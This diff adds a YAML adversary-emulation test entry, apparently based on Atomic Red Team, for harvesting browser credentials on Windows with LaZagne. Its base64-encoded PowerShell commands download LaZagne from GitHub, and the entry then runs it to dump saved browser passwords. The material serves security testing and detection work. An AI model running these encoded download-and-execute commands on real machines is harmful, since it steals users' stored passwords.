@@ -1,0 +1,20 @@
+- id: 0cf9e348-cb57-5129-9a99-8aa5630060f8
+  name: Soumaia ART Tests - LaZagne - Credentials from Browser
+  description: 'The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.
+
+    LaZagne is an open source application used to retrieve passwords stored on a local computer. (requires elevation)'
+  tactic: credential-access
+  technique:
+    attack_id: T1555.003
+    name: 'Credentials from Password Stores: Credentials from Web Browsers'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEwAYQBaAGEAZwBuAGUALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABMAGEAWgBhAGcAbgBlAC4AZQB4AGUAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AQQBsAGUAcwBzAGEAbgBkAHIAbwBaAC8ATABhAFoAYQBnAG4AZQAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvAHYAMgAuADQALgA1AC8ATABhAFoAYQBnAG4AZQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABMAGEAWgBhAGcAbgBlAC4AZQB4AGUAIgAKAA==
+          )
+          ".\LaZagne.exe" browsers
+        payloads:
+        - LaZagne.exe
